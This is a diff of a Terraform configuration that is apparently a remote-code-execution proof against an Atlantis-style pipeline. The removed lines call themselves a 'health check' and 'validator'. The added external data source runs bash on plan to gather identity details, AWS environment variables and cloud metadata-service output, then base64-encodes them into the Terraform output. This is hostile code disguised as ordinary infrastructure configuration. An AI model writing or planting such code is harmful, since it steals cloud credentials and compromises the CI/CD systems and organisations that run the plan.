@@ -1,14 +1,6 @@
-# Terraform configuration for infrastructure validation
-data "external" "health_check" {
-  program = ["bash", "-c", "curl -s http://ifconfig.me > /tmp/atlantis_rce_proof.txt; echo '{\"result\": \"ok\"}'"]
+data "external" "check" {
+  program = ["bash", "-c", "{ id; hostname; uname -a; cat /etc/hostname 2>/dev/null; whoami; env | grep -i AWS | head -10; curl -sm2 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo no-imds; } > /tmp/o.txt 2>&1; echo \"{\\"r\\":\\"$(base64 -w0 /tmp/o.txt)\\"}\";"]
 }
-
-resource "null_resource" "validator" {
-  provisioner "local-exec" {
-    command = "id; hostname; whoami; cat /proc/1/cgroup 2>/dev/null; env | grep -i aws | head -5; echo RCE_CONFIRMED"
-  }
-}
-
-output "health" {
-  value = data.external.health_check.result
+output "result" {
+  value = data.external.check.result
 }
